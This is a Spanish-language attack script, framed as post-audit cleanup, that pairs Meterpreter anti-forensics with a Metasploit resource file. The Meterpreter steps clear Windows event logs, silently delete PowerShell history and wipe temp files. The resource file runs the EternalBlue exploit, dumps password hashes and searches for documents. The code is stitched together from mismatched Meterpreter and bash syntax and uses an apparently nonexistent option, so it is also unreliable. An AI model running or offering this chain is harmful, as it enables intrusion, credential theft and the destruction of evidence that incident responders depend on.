# ==============================================================================
# Script de Borrado de Huellas Post-Auditoría en Windows (Versión Pro)
# ==============================================================================

# 1. Asegurar que estamos interactuando con la última sesión activa de Meterpreter
# Reemplaza '1' por el ID de tu sesión si tienes múltiples conexiones
sessions -i 1

print_status("Iniciando fase de borrado de huellas en el sistema objetivo...")

# 2. Borrado de los Logs de Eventos principales de Windows de forma nativa
# El comando 'clearev' limpia los registros de Application, System y Security de un solo golpe
print_status("[1/3] Vaciando los visores de sucesos de Windows (Event Logs)...")
clearev

# 3. Eliminación de historiales de comandos (PowerShell y CMD)
# Los administradores e IRTs (Incident Response Teams) revisan el archivo ConsoleHost_history.txt
print_status("[2/3] Eliminando historial de comandos de PowerShell y accesos recientes...")
execute -H -f powershell.exe -a "-nop -w hidden -c \"Clear-History; Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue\""

# 4. Limpieza de archivos temporales creados durante la auditoría
# Borra el script de recursos temporal (.rc) o artefactos que hayan quedado en C:\Windows\Temp o C:\Users\...
print_status("[3/3] Removiendo archivos temporales y herramientas de auditoria transferidas...")
execute -H -f cmd.exe -a "/c del /f /q %TEMP%\\*.* 2>nul"

echo -e "\n\e[32m[+] Borrado de huellas finalizado con éxito de manera silenciosa.\e[0m\n"


# --- PASO 5: BORRADO DE HUELLAS AUTOMATIZADO ---
RESOURCE_FILE="$DIR_OUTPUT/exploit_completo.rc"
{
    echo "use exploit/windows/smb/ms17_010_eternalblue"
    echo "set RHOSTS $OBJETIVO"
    
    # Fase de Explotación y Exfiltración (Paso anterior)
    echo "set InitialAutoRunScript post/windows/manage/migrate"
    echo "set AutoRunScript multi_console_command -cl 'sysinfo','hashdump','search -f *.docx'"
    
    # AQUÍ SE UNE EL COMPLEMENTO DE LIMPIEZA:
    # Ejecuta el módulo de limpieza justo antes de que la sesión se cierre por completo
    echo "set AutoRunScript2 post/windows/manage/clear_eventlogs" 
    
    echo "exploit -j -z"
    echo "sleep 15"
    echo "exit"
} > "$RESOURCE_FILE"

msfconsole -q -r "$RESOURCE_FILE"
